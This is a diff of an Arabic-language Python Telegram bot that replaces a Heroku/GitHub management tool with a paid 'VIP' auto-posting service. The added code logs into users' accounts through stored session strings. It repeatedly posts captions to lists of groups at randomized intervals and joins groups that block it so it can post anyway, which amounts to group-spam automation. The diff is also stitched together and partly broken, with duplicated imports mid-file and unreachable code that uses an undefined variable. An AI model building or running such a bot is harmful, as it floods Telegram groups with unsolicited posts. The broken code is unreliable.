+    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
+    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
+    users[str(user_id)]["caption"] = ask.text
+    write(users_db, users)
+    await ask.reply(
+        "- تم تعيين الكليشه الجديده.",
+        reply_to_message_id = ask.id,
+        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
+    )
+
+
+@app.on_callback_query(filters.regex(r"^(newCaption2)$"))
+async def newCaption(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    reMarkup = Markup([
+        [
+            Button("- حاول مره أخرى -", callback_data="newCaption"),
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    await callback.message.delete()
+    try:ask = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
+        reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
+        timeout = 120
+    )
+    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
+    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
+    users[str(user_id)]["caption2"] = ask.text
+    write(users_db, users)
+    await ask.reply(
+        "- تم تعيين الكليشه الجديده.",
+        reply_to_message_id = ask.id,
+        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
+    )
+
+
+@app.on_callback_query(filters.regex(r"^(waitTime)$"))
+async def waitTime(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    reMarkup = Markup([
+        [
+            Button("- حاول مره أخرى -", callback_data="waitTime"),
+            Button("- رجوع -", callback_data="toHome")
+        ]
+    ])
+    await callback.message.delete()
+    try:ask = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- يمكنك ارسال مدة الانتظار ( بالثواني ) الآن.\n\n- أرسل عدد أكبر من 300 .\n\n- استخدم /cancel لإلغاء العمليه.",
+        reply_markup = ForceReply(selective = True, placeholder = "- The duration  < 300 : "),
+        timeout = 120
+    )
+    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام مدة الانتظار.", reply_markup=reMarkup)
+    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
+    try:users[str(user_id)]["waitTime"] = int(ask.text)
+    except ValueError: return await ask.reply("- لا يمكنك وضع هذه البيانات كمده.", reply_markup=reMarkup, reply_to_message_id=ask.id)
+    write(users_db, users)
+    await ask.reply(
+        "- تم تعيين مدة الانتظار.",
+        reply_to_message_id = ask.id,
+        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
+    )
+    
+
+@app.on_callback_query(filters.regex(r"^(startPosting)$"))
+async def startPosting(_: Client,  callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    if users[str(user_id)].get("session") is None: return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
+    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0): return await callback.answer("- لم يتم اضافة اي مجموعات بعد.", show_alert=True) 
+    elif users[str(user_id)].get("posting"): return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
+    
+    users[str(user_id)]["posting"] = True
+    write(users_db, users)
+    create_task(posting(user_id))
+    
+    markup = Markup([
+        [Button("- إيقاف النشر -", callback_data="stopPosting"),
+         Button("- رجوع -", callback_data="toHome")]
+    ])
+    await callback.message.edit_text(
+        "- بدأت عملية النشر التلقائي",
+        reply_markup = markup
+    )
+
+@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
+async def stopPosting(_: Client,  callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    if not users[str(user_id)].get("posting"): return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
+    
+    users[str(user_id)]["posting"] = False
+    write(users_db, users)
+    
+    markup = Markup([
+        [Button("- بدء النشر -", callback_data="startPosting"),
+         Button("- رجوع -", callback_data="toHome")]
+    ])
+    await callback.message.edit_text(
+        "- تم ايقاف عملية النشر التلقائي",
+        reply_markup = markup
+    )
+
+async def posting(user_id):
+    if users[str(user_id)]["posting"]:
+        client = Client(
+            str(user_id),
+            api_id=app.api_id,
+            api_hash=app.api_hash,
+            session_string=users[str(user_id)]["session"]
+        )
+        await client.start()
+
+        while users[str(user_id)]["posting"]:
+            try:
+                sleepTime = random.randint(250, users[str(user_id)]["waitTime"])
+            except KeyError:
+                users[str(user_id)]["waitTime"] = False
+                write(users_db, users)
+                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة وقت.", reply_markup=Markup([[Button("- إضافة وقت -", callback_data="waitTime")]]))
+
+            groups = users[str(user_id)]["groups"]
+            try:
+                caption = users[str(user_id)]["caption"]
+            except KeyError:
+                users[str(user_id)]["posting"] = False
+                write(users_db, users)
+                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))
+
+            for group in groups:
+                if isinstance(group, str) and group.startswith("-"):
+                    group = int(group)
+
+                if not isinstance(group, int) or not str(group).startswith("-100"):
+                    await app.send_message(int(user_id), f"Invalid group ID: {group}")
+                    continue
+
+                try:
+                    await client.send_message(group, caption)
+                except ChatWriteForbidden:
+                    try:
+                        await client.join_chat(group)
+                        await client.send_message(group, caption)
+                    except PeerIdInvalid:
+                        await app.send_message(int(user_id), f"مشكلة في الانضمام للقروب : {group}")
+                    except Exception as e:
+                        await app.send_message(int(user_id), str(e))
+                except PeerIdInvalid:
+                    await app.send_message(int(user_id), f"مشكلة في القروب : {group}")
+                except Exception as e:
+                    await app.send_message(int(user_id), str(e))
+
+            await sleep(sleepTime)
+
+        await client.stop()
+
+
+@app.on_callback_query(filters.regex(r"^(startPosting2)$"))
+async def startPosting2(_: Client,  callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    if users[str(user_id)].get("session") is None: return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
+    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0): return await callback.answer("- لم يتم اضافة اي مجموعات بعد.", show_alert=True) 
+    elif users[str(user_id)].get("posting2"): return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
+    
+    users[str(user_id)]["posting2"] = True
+    write(users_db, users)
+    create_task(posting2(user_id))
+    
+    markup = Markup([
+        [Button("- إيقاف النشر -", callback_data="stopPosting2"),
+         Button("- رجوع -", callback_data="toHome")]
+    ])
+    await callback.message.edit_text(
+        "- بدأت عملية النشر التلقائي",
+        reply_markup = markup
+    )
+
+@app.on_callback_query(filters.regex(r"^(stopPosting2)$"))
+async def stopPosting2(_: Client,  callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id == owner: pass
+    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+    if not users[str(user_id)].get("posting2"): return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
+    
+    users[str(user_id)]["posting2"] = False
+    write(users_db, users)
+    
+    markup = Markup([
+        [Button("- بدء النشر -", callback_data="startPosting2"),
+         Button("- رجوع -", callback_data="toHome")]
+    ])
+    await callback.message.edit_text(
+        "- تم ايقاف عملية النشر التلقائي",
+        reply_markup = markup
+    )
+
+async def posting2(user_id):
+    if users[str(user_id)]["posting2"]:
+        client = Client(
+            str(user_id),
+            api_id=app.api_id,
+            api_hash=app.api_hash,
+            session_string=users[str(user_id)]["session"]
+        )
+        await client.start()
+
+        while users[str(user_id)]["posting2"]:
+            try:
+                sleepTime = random.randint(250, users[str(user_id)]["waitTime"])
+            except KeyError:
+                users[str(user_id)]["waitTime"] = False
+                write(users_db, users)
+                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة وقت.", reply_markup=Markup([[Button("- إضافة وقت -", callback_data="waitTime")]]))
+
+            groups = users[str(user_id)]["groups"]
+            try:
+                caption = users[str(user_id)]["caption2"]
+            except KeyError:
+                users[str(user_id)]["posting2"] = False
+                write(users_db, users)
+                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))
+
+            for group in groups:
+                if isinstance(group, str) and group.startswith("-"):
+                    group = int(group)
+
+                if not isinstance(group, int) or not str(group).startswith("-100"):
+                    await app.send_message(int(user_id), f"Invalid group ID: {group}")
+                    continue
+
+                try:
+                    await client.send_message(group, caption)
+                except ChatWriteForbidden:
+                    try:
+                        await client.join_chat(group)
+                        await client.send_message(group, caption)
+                    except PeerIdInvalid:
+                        await app.send_message(int(user_id), f"مشكلة في الانضمام للقروب : {group}")
+                    except Exception as e:
+                        await app.send_message(int(user_id), str(e))
+                except PeerIdInvalid:
+                    await app.send_message(int(user_id), f"مشكلة في القروب : {group}")
+                except Exception as e:
+                    await app.send_message(int(user_id), str(e))
+
+            await sleep(sleepTime)
+
+        await client.stop()
+
+"""
+USER SECTION ENDED
+the next part for the bot's owner only
+
+
+OWNER SECTION STARTED
+"""
+async def Owner(_, __: Client, message: Message):
+    return (message.from_user.id == owner )
+
+isOwner = filters.create(Owner)
+
+adminMarkup = Markup([
+    [
+        Button("- الغاء VIP -", callback_data="cancelVIP"),
+        Button("- تفعيل VIP -", callback_data="addVIP")
+    ],
+    [
+        Button("- الاحصائيات -", callback_data="statics"),
+        Button("- قنوات الإشتراك -", callback_data="channels")
+    ]
+])
+
+
+@app.on_message(filters.command("admin") & filters.private & isOwner)
+@app.on_callback_query(filters.regex("toAdmin") & isOwner)
+async def admin(_: Client, message: Union[Message, CallbackQuery]):
+    fname = message.from_user.first_name
+    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة المالك"
+    func = message.reply if isinstance(message, Message) else message.message.edit_text
+    await func(
+        caption, 
+        reply_markup = adminMarkup,
+    )
+    
+from pyrogram import Client, filters
+from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from asyncio import create_task
+
+@app.on_callback_query(filters.regex("free"))
+async def addVIP(client: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id
+
+    # تحقق مما إذا كان المستخدم لديه اشتراك VIP بالفعل
+    if str(user_id) in users and users[str(user_id)].get("vip", False):
+        await callback.message.reply("- لديك بالفعل اشتراك VIP. يمكنك استخدامه مرة واحدة فقط.")
         return
 
-    headers = {
-        'Authorization': f'Bearer {user_accounts[user_id][account_index]["api_key"]}',
-        'Accept': 'application/vnd.heroku+json; version=3'
+    reMarkup = InlineKeyboardMarkup([[InlineKeyboardButton("- الصفحه الرئيسيه -", callback_data="toHome")]])
+
+    await callback.message.delete()
+
+    _limit = 1
+    vipDate = timeCalc(_limit)
+
+    users[str(user_id)] = {"vip": True}
+    users[str(user_id)]["limitation"] = {
+        "days": _limit,
+        "startDate": vipDate["current_date"],
+        "endDate": vipDate["end_date"],
+        "endTime": vipDate["endTime"],
     }
-    bot.edit_message_text("جلب التطبيقات... ⬛⬜ 0%", chat_id=call.message.chat.id, message_id=call.message.message_id)
-    time.sleep(2)
-    response = requests.get(f'{HEROKU_BASE_URL}/apps', headers=headers)
-    if response.status_code == 200:
-        apps = response.json()
-        apps_list = "\n".join([f"`{app['name']}`" for app in apps])
-        bot.edit_message_text("جلب التطبيقات... ⬛⬛ 50%", chat_id=call.message.chat.id, message_id=call.message.message_id)
-        time.sleep(2)
-        bot.edit_message_text(f"التطبيقات المتاحة في هيروكو:\n{apps_list}", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button(), parse_mode='Markdown')
-    else:
-        bot.edit_message_text("حدث خطأ في جلب التطبيقات من هيروكو.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
+    write(users_db, users)
+    create_task(vipCanceler(user_id))
 
-# دالة لمعالجة النقرات على الأزرار
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    if call.data == "add_account":
-        add_account(call)
-    elif call.data == "list_accounts":
-        list_accounts(call)
-    elif call.data == "show_events":
-        show_events(call)
-    elif call.data.startswith("select_account_"):
-        account_index = int(call.data.split("_")[-1])
-        bot.edit_message_text(f"إدارة حساب {account_index + 1}:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_account_control_buttons(account_index))
-    elif call.data.startswith("list_heroku_apps_"):
-        list_heroku_apps(call)
-    elif call.data.startswith("delete_app_"):
-        account_index = int(call.data.split("_")[-1])
-        msg = bot.edit_message_text("يرجى إرسال اسم التطبيق لحذفه:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
-        bot.register_next_step_handler(msg, lambda m: handle_app_name_for_deletion(m, account_index))
-    elif call.data.startswith("self_delete_app_"):
-        account_index = int(call.data.split("_")[-1])
-        msg = bot.edit_message_text("يرجى إرسال اسم التطبيق للحذف الذاتي:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
-        bot.register_next_step_handler(msg, lambda m: handle_app_name_for_self_deletion(m, account_index))
-    elif call.data == "remaining_time":
-        show_remaining_time(call)
-    elif call.data == "go_back":
-        bot.edit_message_text("مرحبًا بك! اضغط على الأزرار أدناه لتنفيذ الإجراءات.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_main_buttons())
-    elif call.data == "github_section":
-        bot.edit_message_text("قسم جيتهاب:\nيرجى اختيار إحدى الخيارات:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_github_control_buttons())
-    elif call.data == "upload_file":
-        msg = bot.send_message(call.message.chat.id, "يرجى إرسال ملف مضغوط بصيغة ZIP.")
-        bot.register_next_step_handler(msg, handle_zip_file)
-    elif call.data == "list_github_repos":
-        list_github_repos(call)
-    elif call.data == "delete_repo":
-        msg = bot.send_message(call.message.chat.id, "يرجى إرسال اسم المستودع لحذفه.")
-        bot.register_next_step_handler(msg, handle_repo_deletion)
-    elif call.data == "delete_all_repos":
-        delete_all_repos(call)
+    caption = f"- تم تفعيل اشتراك VIP جديد\n\n- معلومات الاشتراك:\n- تاريخ البدأ: {vipDate['current_date']}\n- تاريخ انتهاء الاشتراك: {vipDate['end_date']}"
+    caption += f"\n\n- المده بالأيام: {_limit} من الأيام\n- المده بالساعات: {vipDate['hours']} من الساعات\n- المده بالدقائق: {vipDate['minutes']} من الدقائق"
+    caption += f"\n\n- وقت انتهاء الاشتراك: {vipDate['endTime']}"
 
-# دالة لحذف مستودع
-def handle_repo_deletion(message):
-    repo_name = message.text.strip()
-    user = g.get_user()
+    await callback.message.reply(
+        caption,
+        reply_markup=reMarkup, 
+    )
+
     try:
-        repo = user.get_repo(repo_name)
-        repo.delete()
-        bot.send_message(message.chat.id, f"تم حذف المستودع `{repo_name}` بنجاح.", parse_mode='Markdown')
-    except:
-        bot.send_message(message.chat.id, f"المستودع `{repo_name}` غير موجود أو لا تملك صلاحية حذفه.", parse_mode='Markdown')
+        await client.send_message(
+            chat_id=user_id,
+            text="- تم تفعيل VIP لك في بوت النشر التلقائي" + caption.split("جديد", 1)[1]
+        )
+    except Exception as e:
+        await callback.message.reply("- اجعل المستخدم يقوم بمراسلة البوت.")
 
-# دالة لحذف جميع المستودعات
-def delete_all_repos(call):
-    user = g.get_user()
-    repos = user.get_repos()
-    repo_count = repos.totalCount
-    for repo in repos:
-        repo.delete()
-    bot.edit_message_text(f"تم حذف جميع المستودعات بنجاح.\nعدد المستودعات المحذوفة: {repo_count}", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='Markdown', reply_markup=create_back_button())
-
-# دالة لعرض مستودعات GitHub
-def list_github_repos(call):
-    user = g.get_user()
-    repos = user.get_repos()
-    repo_list = ""
-    loading_message = bot.send_message(call.message.chat.id, "جارٍ جلب المستودعات، يرجى الانتظار...")
-
-    for repo in repos:
-        try:
-            contents = repo.get_contents("")
-            num_files = sum(1 for _ in contents)
-            repo_list += f"📂 *اسم المستودع*: `{repo.name}`\n📁 *عدد الملفات*: {num_files}\n\n"
-        except:
-            pass
-
-    if repo_list:
-        bot.edit_message_text(f"مستودعات GitHub:\n{repo_list}", chat_id=call.message.chat.id, message_id=loading_message.message_id, parse_mode='Markdown', reply_markup=create_back_button())
-    else:
-        bot.edit_message_text("لا توجد مستودعات لعرضها.", chat_id=call.message.chat.id, message_id=loading_message.message_id, parse_mode='Markdown', reply_markup=create_back_button())
-
-# دالة لمعالجة الملف المضغوط
-# دالة لمعالجة ملف ZIP
-def handle_zip_file(message):
-    if message.document and message.document.mime_type == 'application/zip':
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-        
-        with tempfile.TemporaryDirectory() as temp_dir:
-            zip_path = os.path.join(temp_dir, message.document.file_name)
-            with open(zip_path, 'wb') as new_file:
-                new_file.write(downloaded_file)
-            
-            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-                zip_ref.extractall(temp_dir)
-                repo_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-                user = g.get_user()
-                repo = user.create_repo(repo_name, private=True)
-                
-                for root, dirs, files in os.walk(temp_dir):
-                    for file_name in files:
-                        file_path = os.path.join(root, file_name)
-                        relative_path = os.path.relpath(file_path, temp_dir)
-                        with open(file_path, 'rb') as file_data:
-                            repo.create_file(relative_path, f"Add {relative_path}", file_data.read())
-                
-                num_files = sum([len(files) for r, d, files in os.walk(temp_dir)])
-                bot.send_message(message.chat.id, f"تم إنشاء المستودع بنجاح.\nاسم المستودع: `{repo_name}`\nعدد الملفات: {num_files}", parse_mode='Markdown')
-    else:
-        bot.send_message(message.chat.id, "الملف الذي تم إرساله ليس ملف ZIP. يرجى المحاولة مرة أخرى.")
-
-# دالة لعرض الأحداث
-def show_events(call):
-    if not events:
-        bot.edit_message_text("لا توجد أحداث لعرضها.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
-    else:
-        events_list = "\n".join(events)
-        bot.edit_message_text(f"الأحداث:\n{events_list}", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button(), parse_mode='Markdown')
-
-# دالة لمعالجة اسم التطبيق للحذف
-def handle_app_name_for_deletion(message, account_index):
-    app_name = message.text.strip()
-    user_id = message.from_user.id
-    headers = {
-        'Authorization': f'Bearer {user_accounts[user_id][account_index]["api_key"]}',
-        'Accept': 'application/vnd.heroku+json; version=3'
+@app.on_callback_query(filters.regex("addVIP") & isOwner)
+async def addVIP(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id 
+    reMarkup = Markup([[
+        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
+    ]])
+    await callback.message.delete()
+    try: ask = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- ارسل ايدي المستخدم ليتم تفعيل VIP له",
+        reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
+        timeout = 30
+    )
+    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
+    try: await app.get_chat(int(ask.text))
+    except ValueError: return await ask.reply("- هذا البيانات لا يمكن ان تكون ايدي مستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    except: return await ask.reply("- لم يتم ايجاد هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    try: limit = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- أرسل الآن عدد الأيام المتاحه للعضو.\n\n- ارسل /cancel لإلغاء العمليه.",
+        reply_markup = ForceReply(selective = True, placeholder = "- Days limitation: "),
+        reply_to_message_id = ask.id,
+        timeout = 30
+    )
+    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام عدد الايام المتاحه للمستخدم.")
+    _id = int(ask.text)
+    try:_limit = int(limit.text)
+    except ValueError: return await callback.message.reply("- قيمة المده المتاحه للعضو غير صحيحه.", reply_to_message_id=limit.id, reply_markup=reMarkup)
+    vipDate = timeCalc(_limit)
+    users[str(_id)] = {"vip": True}
+    users[str(_id)]["limitation"] = {
+        "days": _limit,
+        "startDate": vipDate["current_date"],
+        "endDate": vipDate["end_date"],
+        "endTime": vipDate["endTime"],
     }
-    response = requests.delete(f'{HEROKU_BASE_URL}/apps/{app_name}', headers=headers)
-    if response.status_code == 202:
-        events.append(f"حذف [{message.from_user.first_name}](tg://user?id={user_id}) التطبيق: `{app_name[:-2]}**`")
-        bot.send_message(message.chat.id, f"تم حذف التطبيق `{app_name}` بنجاح.", reply_markup=create_main_buttons(), parse_mode='Markdown')
-    else:
-        bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة حذف التطبيق `{app_name}`. يرجى المحاولة مرة أخرى.", reply_markup=create_main_buttons(), parse_mode='Markdown')
+    write(users_db, users)
+    create_task(vipCanceler(_id))
+    caption = f"- تم تفعيل اشتراك VIP جديد\n\n- معلومات الاشتراك:\n- تاريخ البدأ {vipDate['current_date']}\n- تاريخ انتهاء الاشتراك: {vipDate['end_date']}"
+    caption += f"\n\n- المده بالأيام : {_limit} من الأيام\n- المده بالساعات: {vipDate['hours']} من الساعات\n- المده بالدقائق: {vipDate['minutes']} من الدقائق"
+    caption += f"\n\n- وقت انتهاء الاشتراك : {vipDate['endTime']}"
+    await limit.reply(
+        caption,
+        reply_markup = reMarkup, 
+        reply_to_message_id = limit.id
+    )
+    try: await app.send_message(
+        chat_id = _id,
+        text = "- تم تفعيل VIP لك في بوت النشر التلقائي" + caption.split("جديد", 1)[1]
+    )
+    except: await limit.reply("- اجعل المستخدم يقوم بمراسلة البوت.")
 
-# دالة لمعالجة اسم التطبيق للحذف الذاتي
-def handle_app_name_for_self_deletion(message, account_index):
-    app_name = message.text.strip()
-    user_id = message.from_user.id
-    if app_name in self_deleting_apps:
-        bot.send_message(message.chat.id, "تم جدولة الحذف الذاتي لهذا التطبيق مسبقًا.", reply_markup=create_main_buttons())
-    else:
-        delay = 24 * 60 * 60  # 24 ساعة
-        self_deleting_apps[app_name] = threading.Timer(delay, delete_heroku_app, [app_name, user_accounts[user_id][account_index]["api_key"]])
-        self_deleting_apps[app_name].start()
-        events.append(f"قام [{message.from_user.first_name}](tg://user?id={user_id}) بتفعيل الحذف الذاتي للتطبيق: `{app_name[:-2]}**`")
-        bot.send_message(message.chat.id, f"تم جدولة الحذف الذاتي للتطبيق `{app_name}` بعد 24 ساعة.", reply_markup=create_main_buttons(), parse_mode='Markdown')
 
-# دالة لحذف تطبيق هيروكو بعد فترة
-def delete_heroku_app(app_name, api_key):
-    headers = {
-        'Authorization': f'Bearer {api_key}',
-        'Accept': 'application/vnd.heroku+json; version=3'
+@app.on_callback_query(filters.regex(r"^(cancelVIP)$") & isOwner)
+async def cancelVIP(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id 
+    reMarkup = Markup([[
+        Button("- الصفحه الرئيسيه -", callback_data="toAdmin")
+    ]])
+    await callback.message.delete()
+    try: ask = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- ارسل ايدي المستخدم ليتم الغاء VIP الخاص به",
+        reply_markup = ForceReply(selective = True, placeholder = "- user id: "),
+        timeout = 30
+    )
+    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
+    if users.get(ask.text) is None: return await ask.reply("- هذا المستخدم غير موجود في تخزين البوت.", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    elif not users[ask.text]["vip"]: return await ask.reply("- هذا المستخدم ليس من مستخدمي VIP.", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    else:
+        users[ask.text]["vip"] = False
+        write(users_db, users)
+        await ask.reply("- تم الغاء اشتراك هذا المستخدم.", reply_to_message_id=ask.id, reply_markup=reMarkup)
+
+
+@app.on_callback_query(filters.regex(r"^(channels)$") & isOwner)
+async def channelsControl(_: Client, callback: CallbackQuery):
+    fname = callback.from_user.first_name
+    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
+    markup = [
+        [
+            Button(channel, url=channel + ".t.me"),
+            Button("🗑", callback_data=f"removeChannel {channel}")
+        ] for channel in channels
+    ]
+    markup.extend([
+        [Button("- إضافة قناه جديده -", callback_data="addChannel")],
+        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
+        ])
+    await callback.message.edit_text(
+        caption,
+        reply_markup = Markup(markup) 
+    )
+
+
+@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwner)
+async def addChannel(_: Client, callback: CallbackQuery):
+    user_id = callback.from_user.id 
+    reMarkup = Markup([[
+        Button("- العوده للقنوات -", callback_data="channels")
+    ]])
+    await callback.message.delete()
+    try: ask = await listener.listen(
+        from_id = user_id, 
+        chat_id = user_id, 
+        text = "- ارسل معرف القناه دون @.",
+        reply_markup = ForceReply(selective = True, placeholder = "- channel username: "),
+        timeout = 30
+    )
+    except exceptions.TimeOut: return await callback.message.reply("- نفذ وقت استلام ايدي المستخدم.", reply_markup=reMarkup)
+    try: await app.get_chat(ask.text)
+    except: return await callback.message.reply("- لم يتم ايجاد هذه الدردشه.")
+    channel = ask.text
+    channels.append(channel)
+    write(channels_db, channels)
+    await ask.reply("- تم إضافة القناه الى القائمه.", reply_to_message_id=ask.id, reply_markup=reMarkup)
+    
+    
+@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwner)
+async def removeChannel(_: Client, callback: CallbackQuery):
+    channel = callback.data.split()[1]
+    if channel not in channels: await callback.answer("- هذه القناه غير موجوده بالفعل.")
+    else:
+        channels.remove(channel)
+        write(channels_db, channels)
+        await callback.answer("- تم حذف هذه القناه")
+    fname = callback.from_user.first_name
+    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
+    markup = [
+        [
+            Button(channel, url=channel + ".t.me"),
+            Button("🗑", callback_data=f"removeChannel {channel}")
+        ] for channel in channels
+    ]
+    markup.extend([
+        [Button("- إضافة قناه جديده -", callback_data="addChannel")],
+        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
+        ])
+    await callback.message.edit_text(
+        caption,
+        reply_markup = Markup(markup) 
+    )
+    
+
+@app.on_callback_query(filters.regex(f"^(statics)$") & isOwner)
+async def statics(_: Client, callback: CallbackQuery):
+    total = len(users)
+    vip = 0
+    for user in users:
+        if users[user]["vip"]: vip += 1 
+        else: continue
+    reMarkup = Markup([
+        [Button("- الصفحه الرئيسيه -", callback_data="toAdmin")]
+    ])
+    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
+    await callback.message.edit_text(
+        caption, 
+        reply_markup = reMarkup 
+    )
+
+_timezone = timezone("Asia/Baghdad")
+
+def timeCalc(limit):
+    start_date = datetime.now(_timezone)
+    end_date = start_date + timedelta(days=limit)
+    hours = limit * 24
+    minutes = hours * 60
+    return {
+        "current_date": start_date.strftime("%Y-%m-%d"),
+        "end_date": end_date.strftime("%Y-%m-%d"),
+        "endTime": end_date.strftime("%H:%M"),
+        "hours": hours,
+        "minutes": minutes
     }
-    requests.delete(f'{HEROKU_BASE_URL}/apps/{app_name}', headers=headers)
-    del self_deleting_apps[app_name]
+    users[str(_id)] = {"vip": False}
 
-# دالة لعرض الوقت المتبقي للحذف الذاتي
-def show_remaining_time(call):
-    user_id = call.from_user.id
-    if not self_deleting_apps:
-        bot.edit_message_text("لا توجد تطبيقات مجدولة للحذف الذاتي.", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button())
-    else:
-        remaining_times = []
-        for app_name, timer in self_deleting_apps.items():
-            remaining_time = timer.interval - (time.time() - timer.when)
-            remaining_times.append(f"التطبيق: `{app_name[:-2]}**` - الوقت المتبقي: {str(timedelta(seconds=remaining_time))}")
-        bot.edit_message_text("الوقت المتبقي للحذف الذاتي:\n" + "\n".join(remaining_times), chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=create_back_button(), parse_mode='Markdown')
 
-# التشغيل
-if __name__ == "__main__":
-    bot.polling()
+async def vipCanceler(user_id):
+    await sleep(60)
+    current_day = datetime.now(_timezone)
+    cdate = current_day.strftime("%Y-%m-%d %H:%M")
+    while True:
+        print()
+        if users[str(user_id)]["vip"] == False: break
+        elif cdate != (users[str(user_id)]["limitation"]["endDate"] + " " + users[str(user_id)]["limitation"]["endTime"]):
+            current_day = datetime.now(_timezone)
+            cdate = current_day.strftime("%Y-%m-%d %H:%M") 
+        else:
+            break
+        await sleep(20)
+    users[str(user_id)] = {"vip": False}
+    users[str(user_id)]["limitation"] = {}
+    write(users_db, users)
+    await app.send_message(
+        user_id,
+        "- انتهى اشتراك VIP الخاص بك.\n- راسل المطور اذا كنت تريد تجديد اشتراكك."
+    )
+
+"""
+OWNER SECTION ENDED
+the next part for the bot's setting and storage
+"""
